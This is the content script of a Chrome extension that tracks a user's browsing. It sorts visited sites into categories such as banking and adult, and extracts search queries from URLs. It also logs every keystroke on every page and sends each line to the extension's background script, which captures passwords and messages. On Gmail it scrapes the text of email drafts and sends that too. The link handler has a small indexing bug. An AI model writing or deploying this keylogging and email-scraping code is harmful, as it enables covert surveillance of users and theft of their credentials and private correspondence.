//code for interacting with user browsing activity.
var categories = [['google.com', 'Internet and Telecom > Search Engine'], ['facebook.com', 'Internet and Telecom > Social Network'], ['youtube.com', 'Arts and Entertainment > TV and Video'], ['amazon.com', 'Shopping > General Merchandise'], ['yahoo.com', 'News and Media'], ['pornhub.com', 'Adult'], ['xnxx.com', 'Adult'], ['xvideos.com', 'Adult'], ['ebay.com', 'Shopping > General Merchandise'], ['twitter.com', 'Internet and Telecom > Social Network'], ['wikipedia.org', 'Reference > Dictionaries and Encyclopedias'], ['instagram.com', 'Internet and Telecom > Social Network'], ['reddit.com', 'Internet and Telecom > Social Network'], ['bing.com', 'Internet and Telecom > Search Engine'], ['craigslist.org', 'Shopping > Classifieds'], ['live.com', 'Internet and Telecom > Email'], ['walmart.com', 'Shopping > General Merchandise'], ['xhamster.com', 'Adult'], ['netflix.com', 'Arts and Entertainment > TV and Video'], ['ampproject.org', 'Computer and Electronics > Software'], ['espn.com', 'News and Media > Sports News'], ['chase.com', 'Finance > Banking'], ['pinterest.com', 'Internet and Telecom > Social Network'], ['paypal.com', 'Finance > Financial Management'], ['tumblr.com', 'Internet and Telecom > Social Network'], ['cnn.com', 'News and Media'], ['linkedin.com', 'Internet and Telecom > Social Network'], ['msn.com', 'News and Media'], ['chaturbate.com', 'Adult'], ['indeed.com', 'Career and Education > Jobs and Employment'], ['office.com', 'Computer and Electronics > Software'], ['target.com', 'Shopping'], ['foxnews.com', 'News and Media'], ['imdb.com', 'Arts and Entertainment > Movies'], ['bestbuy.com', 'Shopping > Consumer Electronics'], ['zillow.com', 'Business and Industry > Real Estate'], ['accuweather.com', 'News and Media > Weather'], ['xfinity.com', 'Arts and Entertainment > TV and Video'], ['imgur.com', 'Internet and Telecom > File Sharing'], ['wellsfargo.com', 'Finance > Banking'], ['dailymail.co.uk', 'News and Media > Newspapers'], ['drudgereport.com', 'News and Media'], ['homedepot.com', 'Shopping > Home and Garden'], ['nytimes.com', 'News and Media > Newspapers'], ['bankofamerica.com', 'Finance > Banking'], ['yelp.com', 'Reference > Directories'], ['etsy.com', 'Shopping > General Merchandise'], ['microsoftonline.com', 'Computer and Electronics > Software'], ['duckduckgo.com', 'Internet and Telecom > Search Engine'], ['wikia.com', 'Arts and Entertainment > TV and Video'], ['stackoverflow.com', 'Internet and Telecom > Social Network'], ['github.com', 'Internet and Telecom > Social Network']];

var query = '';
let currentLocation;
let gmailText = '';

window.onload = function() {
  // console.log(window.location.href);
  getSearch();
  currentLocation = window.location.href;
  for (var i = 0; i < categories.length; i++) {
    if (currentLocation.search(categories[i][0]) != -1) {
      console.log("Matches " + categories[i][1]);
      matchCategories(categories[i][1]);
    }
  }
}

function trackMouse() {
  // let images = document.getElementsByTagName("img");
  let links = document.getElementsByTagName("a");
  // console.log(images);

  // for (var i = 0; i < images.length-1; i++) {
  //   images[i].onmouseover = function() {
  //     console.log(this.src);
  //   }
  // }

  for (var i = 0; i < links.length; i++) {
    links[i].onmousedown = function() {
      console.log(this.href);
      for (var i = 0; i < categories.length; i++) {
        if (this.href.search(categories[i][0]) != -1) {
          console.log(categories[i][0] + " matches!");
          console.log(categories[i][1]);
          matchCategories(categories[1][1]);
        }
      }
    }
  }

  if (window.location.href.indexOf("mail.google.com") != -1) {
    console.log("ON GMAIL");

    document.body.onmousedown = function(e) {
      getGmailText();
    }
  }
}

function trackKeys() {
  let body = document.body;
  let line = '';

  body.onkeyup = function(e) {
    line += e.key;
    if (e.key === 'Enter') {
      chrome.runtime.sendMessage({msg: 'new keystrokes', keystrokes: line}, function(response) {
        console.log("data updated");
      });
      console.log(line);
      line = '';
    }
  }
}

function matchCategories(long) {
  long = long.toLowerCase();
  toSend = '';
  if (long.search('shopping') != -1) {
    toSend = 'commerce';
    // console.log("commerce: " + commerce);
  } else if (long.search("social") != -1) {
    toSend = 'social';
  } else if (long.search("finance") != -1) {
    toSend = 'finance';
  } else if (long.search("news") != -1 || long.search("entertainment") != -1 || long.search("media") != -1 || long.search("reference") != -1) {
    toSend = 'info';
  } else if (long.search("adult") != -1) {
    toSend = 'adult';
  } else if (long.search("search") != -1) {
    toSend = 'search';
  } else {
    toSend = 'confounder';
  }

  chrome.runtime.sendMessage({cmd: 'update', data: toSend}, function(response) {
    console.log("data updated");
  });

}

function getSearch() {
  var searchQuery = window.location.search;
  searchQuery = searchQuery.substring(
    searchQuery.indexOf("=") + 1,
    searchQuery.indexOf("&")
  );
  searchQuery = searchQuery.replace(/\+/g, ' ');
  query += searchQuery + ' ';
  console.log(query);

  chrome.runtime.sendMessage({msg: 'new search', data: query}, function(response) {
    console.log("search data updated");
  });
}

function getGmailText() {
  let emailBoxes = document.getElementsByClassName("editable");
  // console.log(emailBoxes);
  if (emailBoxes.length > 0) {
    for (var i = 0; i < emailBoxes.length; i++) {
      if (emailBoxes[i].innerText != "\n") {
        // console.log(emailBoxes[i].innerText);
        chrome.runtime.sendMessage({msg: 'new email', data: emailBoxes[i].innerText}, function(response) {
          console.log("email data updated");
        });
      }
    }
  }
}

trackMouse();
trackKeys();
